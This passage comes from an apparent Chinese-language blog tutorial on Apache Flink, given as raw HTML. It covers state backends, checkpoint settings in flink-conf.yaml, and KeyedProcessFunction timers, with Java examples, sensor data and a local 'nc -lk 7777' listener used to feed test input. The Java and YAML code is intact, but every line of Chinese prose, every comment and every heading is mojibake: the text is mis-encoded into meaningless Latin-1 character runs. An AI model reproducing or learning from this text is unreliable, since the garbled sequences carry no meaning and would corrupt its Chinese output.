æ›´æ–°ä¿å­˜çš„&quot;ä¸Šä¸€æ¬¡æ¸©åº¦&quot;</span></span><br><span class="line">      lastTemperature.update(curTemp);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> å¯åŠ¨socket  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lk 7777</span><br></pre></td></tr></table></figure></li><li><p>è¾“å…¥æ•°æ®ï¼ŒæŸ¥çœ‹ç»“æœ </p><ul><li><p> è¾“å…¥  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_1,1547718199,32.4</span><br><span class="line">sensor_1,1547718199,42.4</span><br><span class="line">sensor_10,1547718205,52.6   </span><br><span class="line">sensor_10,1547718205,22.5</span><br><span class="line">sensor_7,1547718202,6.7</span><br><span class="line">sensor_7,1547718202,9.9</span><br><span class="line">sensor_1,1547718207,36.3</span><br><span class="line">sensor_7,1547718202,19.9</span><br><span class="line">sensor_7,1547718202,30</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡º<br><em>ä¸­é—´æ²¡æœ‰è¾“å‡ºï¼ˆsensor_7,9.9,19.9)ï¼Œåº”è¯¥æ˜¯doubleæµ®ç‚¹æ•°è®¡ç®—ç²¾åº¦é—®é¢˜ï¼Œä¸ç®¡å®ƒ</em>  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(sensor_1,32.4,42.4)</span><br><span class="line">(sensor_10,52.6,22.5)</span><br><span class="line">(sensor_7,19.9,30.0)</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="çŠ¶æ€åç«¯-State-Backends"><a href="#çŠ¶æ€åç«¯-State-Backends" class="headerlink" title="çŠ¶æ€åç«¯ State Backends"></a>çŠ¶æ€åç«¯ State Backends</h4><blockquote><p><a href="https://blog.csdn.net/dongkang123456/article/details/108430338">Flink_Flinkä¸­çš„çŠ¶æ€</a></p></blockquote><h5 id="æ¦‚è¿°-2"><a href="#æ¦‚è¿°-2" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h5><ul><li> æ¯ä¼ å…¥ä¸€æ¡æ•°æ®ï¼Œæœ‰çŠ¶æ€çš„ç®—å­ä»»åŠ¡éƒ½ä¼šè¯»å–å’Œæ›´æ–°çŠ¶æ€ã€‚ </li><li> ç”±äºæœ‰æ•ˆçš„çŠ¶æ€è®¿é—®å¯¹äºå¤„ç†æ•°æ®çš„ä½å»¶è¿Ÿè‡³å…³é‡è¦ï¼Œå› æ­¤æ¯ä¸ªå¹¶è¡Œä»»åŠ¡éƒ½ä¼šåœ¨æœ¬åœ°ç»´æŠ¤å…¶çŠ¶æ€ï¼Œä»¥ç¡®ä¿å¿«é€Ÿçš„çŠ¶æ€è®¿é—®ã€‚ </li><li> çŠ¶æ€çš„å­˜å‚¨ã€è®¿é—®ä»¥åŠç»´æŠ¤ï¼Œç”±ä¸€ä¸ªå¯æ’å…¥çš„ç»„ä»¶å†³å®šï¼Œè¿™ä¸ªç»„ä»¶å°±å«åš<strong>çŠ¶æ€åç«¯( state backend)</strong> </li><li> <strong>çŠ¶æ€åç«¯ä¸»è¦è´Ÿè´£ä¸¤ä»¶äº‹ï¼šæœ¬åœ°çŠ¶æ€ç®¡ç†ï¼Œä»¥åŠå°†æ£€æŸ¥ç‚¹(checkPoint)çŠ¶æ€å†™å…¥è¿œç¨‹å­˜å‚¨</strong> </li></ul><h5 id="é€‰æ‹©ä¸€ä¸ªçŠ¶æ€åç«¯"><a href="#é€‰æ‹©ä¸€ä¸ªçŠ¶æ€åç«¯" class="headerlink" title="é€‰æ‹©ä¸€ä¸ªçŠ¶æ€åç«¯"></a>é€‰æ‹©ä¸€ä¸ªçŠ¶æ€åç«¯</h5><ul><li>MemoryStateBackend <ul><li>å†…å­˜çº§çš„çŠ¶æ€åç«¯ï¼Œä¼šå°†é”®æ§çŠ¶æ€ä½œä¸ºå†…å­˜ä¸­çš„å¯¹è±¡è¿›è¡Œç®¡ç†ï¼Œå°†å®ƒä»¬å­˜å‚¨åœ¨TaskManagerçš„JVMå †ä¸Šï¼Œè€Œå°†checkpointå­˜å‚¨åœ¨JobManagerçš„å†…å­˜ä¸­</li><li>ç‰¹ç‚¹ï¼šå¿«é€Ÿã€ä½å»¶è¿Ÿï¼Œä½†ä¸ç¨³å®š</li></ul></li><li>FsStateBackendï¼ˆé»˜è®¤ï¼‰ <ul><li>å°†checkpointå­˜åˆ°è¿œç¨‹çš„æŒä¹…åŒ–æ–‡ä»¶ç³»ç»Ÿï¼ˆFileSystemï¼‰ä¸Šï¼Œè€Œå¯¹äºæœ¬åœ°çŠ¶æ€ï¼Œè·ŸMemoryStateBackendä¸€æ ·ï¼Œä¹Ÿä¼šå­˜åœ¨TaskManagerçš„JVMå †ä¸Š</li><li>åŒæ—¶æ‹¥æœ‰å†…å­˜çº§çš„æœ¬åœ°è®¿é—®é€Ÿåº¦ï¼Œå’Œæ›´å¥½çš„å®¹é”™ä¿è¯</li></ul></li><li>RocksDBStateBackend <ul><li>å°†æ‰€æœ‰çŠ¶æ€åºåˆ—åŒ–åï¼Œå­˜å…¥æœ¬åœ°çš„RocksDBä¸­å­˜å‚¨</li></ul></li></ul><h5 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h5><p><code>flink-conf.yaml</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###==============================================================================</span></span><br><span class="line"><span class="comment">### Fault tolerance and checkpointing</span></span><br><span class="line"><span class="comment">###==============================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### The backend that will be used to store operator state checkpoints if</span></span><br><span class="line"><span class="comment">### checkpointing is enabled.</span></span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="comment">### Supported backends are &#x27;jobmanager&#x27;, &#x27;filesystem&#x27;, &#x27;rocksdb&#x27;, or the</span></span><br><span class="line"><span class="comment">### &lt;class-name-of-factory&gt;.</span></span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="comment">### state.backend: filesystem</span></span><br><span class="line"><span class="string">ä¸Šé¢è¿™ä¸ªå°±æ˜¯é»˜è®¤çš„checkpointå­˜åœ¨filesystem</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### Directory for checkpoints filesystem, when using any of the default bundled</span></span><br><span class="line"><span class="comment">### state backends.</span></span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="comment">### state.checkpoints.dir: hdfs://namenode-host:port/flink-checkpoints</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Default target directory for savepoints, optional.</span></span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="comment">### state.savepoints.dir: hdfs://namenode-host:port/flink-savepoints</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Flag to enable/disable incremental checkpoints for backends that</span></span><br><span class="line"><span class="comment">### support incremental checkpoints (like the RocksDB state backend). </span></span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="comment">### state.backend.incremental: false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### The failover strategy, i.e., how the job computation recovers from task failures.</span></span><br><span class="line"><span class="comment">### Only restart tasks that may have been affected by the task failure, which typically includes</span></span><br><span class="line"><span class="comment">### downstream tasks and potentially upstream tasks if their produced data is no longer available for consumption.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobmanager.execution.failover-strategy:</span> <span class="string">region</span></span><br><span class="line"></span><br><span class="line"><span class="string">ä¸Šé¢è¿™ä¸ªregionæŒ‡ï¼Œå¤šä¸ªå¹¶è¡Œåº¦çš„ä»»åŠ¡è¦æ˜¯æœ‰ä¸ªæŒ‚æ‰äº†ï¼Œåªé‡å¯é‚£ä¸ªä»»åŠ¡æ‰€å±çš„regionï¼ˆå¯èƒ½å«æœ‰å¤šä¸ªå­ä»»åŠ¡ï¼‰ï¼Œè€Œä¸éœ€è¦é‡å¯æ•´ä¸ªFlinkç¨‹åº</span></span><br></pre></td></tr></table></figure><h5 id="æ ·ä¾‹ä»£ç "><a href="#æ ·ä¾‹ä»£ç " class="headerlink" title="æ ·ä¾‹ä»£ç "></a>æ ·ä¾‹ä»£ç </h5><ul><li><p> å…¶ä¸­ä½¿ç”¨RocksDBStateBackendéœ€è¦å¦å¤–åŠ å…¥pomä¾èµ–  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- RocksDBStateBackend --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-statebackend-rocksdb_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.state;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.restartstrategy.RestartStrategies;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.contrib.streaming.state.RocksDBStateBackend;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.runtime.state.filesystem.FsStateBackend;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.runtime.state.memory.MemoryStateBackend;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.CheckpointingMode;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/2 11:35 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StateTest4_FaultTolerance</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. çŠ¶æ€åç«¯é…ç½®</span></span><br><span class="line">        env.setStateBackend(<span class="keyword">new</span> MemoryStateBackend());</span><br><span class="line">        env.setStateBackend(<span class="keyword">new</span> FsStateBackend(<span class="string">&quot;checkpointDataUri&quot;</span>));</span><br><span class="line">        <span class="comment">// è¿™ä¸ªéœ€è¦å¦å¤–å¯¼å…¥ä¾èµ–</span></span><br><span class="line">        env.setStateBackend(<span class="keyword">new</span> RocksDBStateBackend(<span class="string">&quot;checkpointDataUri&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// socketæ–‡æœ¬æµ</span></span><br><span class="line">        DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è½¬æ¢æˆSensorReadingç±»å‹</span></span><br><span class="line">        DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">            String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        dataStream.print();</span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="ProcessFunction-API-åº•å±‚API"><a href="#ProcessFunction-API-åº•å±‚API" class="headerlink" title="ProcessFunction API(åº•å±‚API)"></a>ProcessFunction API(åº•å±‚API)</h3><pre><code>æˆ‘ä»¬ä¹‹å‰å­¦ä¹ çš„**è½¬æ¢ç®—å­**æ˜¯æ— æ³•è®¿é—®äº‹ä»¶çš„æ—¶é—´æˆ³ä¿¡æ¯å’Œæ°´ä½çº¿ä¿¡æ¯çš„ã€‚è€Œè¿™åœ¨ä¸€äº›åº”ç”¨åœºæ™¯ä¸‹ï¼Œæä¸ºé‡è¦ã€‚ä¾‹å¦‚MapFunctionè¿™æ ·çš„mapè½¬æ¢ç®—å­å°±æ— æ³•è®¿é—®æ—¶é—´æˆ³æˆ–è€…å½“å‰äº‹ä»¶çš„äº‹ä»¶æ—¶é—´ã€‚åŸºäºæ­¤ï¼ŒDataStream APIæä¾›äº†ä¸€ç³»åˆ—çš„Low-Levelè½¬æ¢ç®—å­ã€‚å¯ä»¥**è®¿é—®æ—¶é—´æˆ³**ã€**watermark**ä»¥åŠ**æ³¨å†Œå®šæ—¶äº‹ä»¶**ã€‚è¿˜å¯ä»¥è¾“å‡º**ç‰¹å®šçš„ä¸€äº›äº‹ä»¶**ï¼Œä¾‹å¦‚è¶…æ—¶äº‹ä»¶ç­‰ã€‚Process Functionç”¨æ¥æ„å»ºäº‹ä»¶é©±åŠ¨çš„åº”ç”¨ä»¥åŠå®ç°è‡ªå®šä¹‰çš„ä¸šåŠ¡é€»è¾‘(ä½¿ç”¨ä¹‹å‰çš„windowå‡½æ•°å’Œè½¬æ¢ç®—å­æ— æ³•å®ç°)ã€‚ä¾‹å¦‚ï¼ŒFlinkSQLå°±æ˜¯ä½¿ç”¨Process Functionå®ç°çš„ã€‚</code></pre><p>Flinkæä¾›äº†8ä¸ªProcess Functionï¼š</p><ul><li>ProcessFunction</li><li>KeyedProcessFunction</li><li>CoProcessFunction</li><li>ProcessJoinFunction</li><li>BroadcastProcessFunction</li><li>KeyedBroadcastProcessFunction</li><li>ProcessWindowFunction</li><li>ProcessAllWindowFunction</li></ul><h4 id="KeyedProcessFunction"><a href="#KeyedProcessFunction" class="headerlink" title="KeyedProcessFunction"></a>KeyedProcessFunction</h4><pre><code>è¿™ä¸ªæ˜¯ç›¸å¯¹æ¯”è¾ƒå¸¸ç”¨çš„ProcessFunctionï¼Œæ ¹æ®åå­—å°±å¯ä»¥çŸ¥é“æ˜¯ç”¨åœ¨keyedStreamä¸Šçš„ã€‚KeyedProcessFunctionç”¨æ¥æ“ä½œKeyedStreamã€‚KeyedProcessFunctionä¼šå¤„ç†æµçš„æ¯ä¸€ä¸ªå…ƒç´ ï¼Œè¾“å‡ºä¸º0ä¸ªã€1ä¸ªæˆ–è€…å¤šä¸ªå…ƒç´ ã€‚æ‰€æœ‰çš„Process Functionéƒ½ç»§æ‰¿è‡ªRichFunctionæ¥å£ï¼Œæ‰€ä»¥éƒ½æœ‰`open()`ã€`close()`å’Œ`getRuntimeContext()`ç­‰æ–¹æ³•ã€‚è€Œ`KeyedProcessFunction&lt;K, I, O&gt;`è¿˜é¢å¤–æä¾›äº†ä¸¤ä¸ªæ–¹æ³•:</code></pre><ul><li><code>processElement(I value, Context ctx, Collector&lt;O&gt; out)</code>ï¼Œæµä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ éƒ½ä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œè°ƒç”¨ç»“æœå°†ä¼šæ”¾åœ¨Collectoræ•°æ®ç±»å‹ä¸­è¾“å‡ºã€‚Contextå¯ä»¥è®¿é—®å…ƒç´ çš„æ—¶é—´æˆ³ï¼Œå…ƒç´ çš„ key ï¼Œä»¥åŠTimerService æ—¶é—´æœåŠ¡ã€‚ Context è¿˜å¯ä»¥å°†ç»“æœè¾“å‡ºåˆ°åˆ«çš„æµ(side outputs)ã€‚</li><li><code>onTimer(long timestamp, OnTimerContext ctx, Collector&lt;O&gt; out)</code>ï¼Œæ˜¯ä¸€ä¸ªå›è°ƒå‡½æ•°ã€‚å½“ä¹‹å‰æ³¨å†Œçš„å®šæ—¶å™¨è§¦å‘æ—¶è°ƒç”¨ã€‚å‚æ•°timestamp ä¸ºå®šæ—¶å™¨æ‰€è®¾å®šçš„è§¦å‘çš„æ—¶é—´æˆ³ã€‚Collector ä¸ºè¾“å‡ºç»“æœçš„é›†åˆã€‚OnTimerContextå’ŒprocessElementçš„Context å‚æ•°ä¸€æ ·ï¼Œæä¾›äº†ä¸Šä¸‹æ–‡çš„ä¸€äº›ä¿¡æ¯ï¼Œä¾‹å¦‚å®šæ—¶å™¨è§¦å‘çš„æ—¶é—´ä¿¡æ¯(äº‹ä»¶æ—¶é—´æˆ–è€…å¤„ç†æ—¶é—´)ã€‚</li></ul><h5 id="æµ‹è¯•ä»£ç -3"><a href="#æµ‹è¯•ä»£ç -3" class="headerlink" title="æµ‹è¯•ä»£ç "></a>æµ‹è¯•ä»£ç </h5><p>è®¾ç½®ä¸€ä¸ªè·å–æ•°æ®åç¬¬5sç»™å‡ºæç¤ºä¿¡æ¯çš„å®šæ—¶å™¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> processfunction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.KeyedProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/3 12:30 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProcessTest1_KeyedProcessFunction</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// socketæ–‡æœ¬æµ</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è½¬æ¢æˆSensorReadingç±»å‹</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æµ‹è¯•KeyedProcessFunctionï¼Œå…ˆåˆ†ç»„ç„¶åè‡ªå®šä¹‰å¤„ç†</span></span><br><span class="line">    dataStream.keyBy(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">      .process( <span class="keyword">new</span> MyProcess() )</span><br><span class="line">      .print();</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰çš„å¤„ç†å‡½æ•°</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyProcess</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Tuple</span>, <span class="title">SensorReading</span>, <span class="title">Integer</span>&gt; </span>&#123;</span><br><span class="line">    ValueState&lt;Long&gt; tsTimerState;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      tsTimerState =  getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Long&gt;(<span class="string">&quot;ts-timer&quot;</span>, Long.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(SensorReading value, Context ctx, Collector&lt;Integer&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      out.collect(value.getId().length());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// context</span></span><br><span class="line">      <span class="comment">// Timestamp of the element currently being processed or timestamp of a firing timer.</span></span><br><span class="line">      ctx.timestamp();</span><br><span class="line">      <span class="comment">// Get key of the element being processed.</span></span><br><span class="line">      ctx.getCurrentKey();</span><br><span class="line">      <span class="comment">//            ctx.output();</span></span><br><span class="line">      ctx.timerService().currentProcessingTime();</span><br><span class="line">      ctx.timerService().currentWatermark();</span><br><span class="line">      <span class="comment">// åœ¨5å¤„ç†æ—¶é—´çš„5ç§’å»¶è¿Ÿåè§¦å‘</span></span><br><span class="line">      ctx.timerService().registerProcessingTimeTimer( ctx.timerService().currentProcessingTime() + <span class="number">5000L</span>);</span><br><span class="line">      tsTimerState.update(ctx.timerService().currentProcessingTime() + <span class="number">1000L</span>);</span><br><span class="line">      <span class="comment">//            ctx.timerService().registerEventTimeTimer((value.getTimestamp() + 10) * 1000L);</span></span><br><span class="line">      <span class="comment">// åˆ é™¤æŒ‡å®šæ—¶é—´è§¦å‘çš„å®šæ—¶å™¨</span></span><br><span class="line">      <span class="comment">//            ctx.timerService().deleteProcessingTimeTimer(tsTimerState.value());</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;Integer&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      System.out.println(timestamp + <span class="string">&quot; å®šæ—¶å™¨è§¦å‘&quot;</span>);</span><br><span class="line">      ctx.getCurrentKey();</span><br><span class="line">      <span class="comment">//            ctx.output();</span></span><br><span class="line">      ctx.timeDomain();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      tsTimerState.clear();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯åŠ¨æœ¬åœ°socket</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lk 7777</span><br></pre></td></tr></table></figure><p>è¾“å…¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718207,36.3</span><br></pre></td></tr></table></figure><p>è¾“å‡º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8</span><br><span class="line">1612283803911 å®šæ—¶å™¨è§¦å‘</span><br></pre></td></tr></table></figure><h4 id="TimerServiceå’Œå®šæ—¶å™¨-Timers"><a href="#TimerServiceå’Œå®šæ—¶å™¨-Timers" class="headerlink" title="TimerServiceå’Œå®šæ—¶å™¨(Timers)"></a>TimerServiceå’Œå®šæ—¶å™¨(Timers)</h4><pre><code>Context å’ŒOnTimerContext æ‰€æŒæœ‰çš„TimerService å¯¹è±¡æ‹¥æœ‰ä»¥ä¸‹æ–¹æ³•ï¼š</code></pre><ul><li> <code>long currentProcessingTime()</code> è¿”å›å½“å‰å¤„ç†æ—¶é—´ </li><li> <code>long currentWatermark()</code> è¿”å›å½“å‰watermark çš„æ—¶é—´æˆ³ </li><li> <code>void registerProcessingTimeTimer( long timestamp)</code> 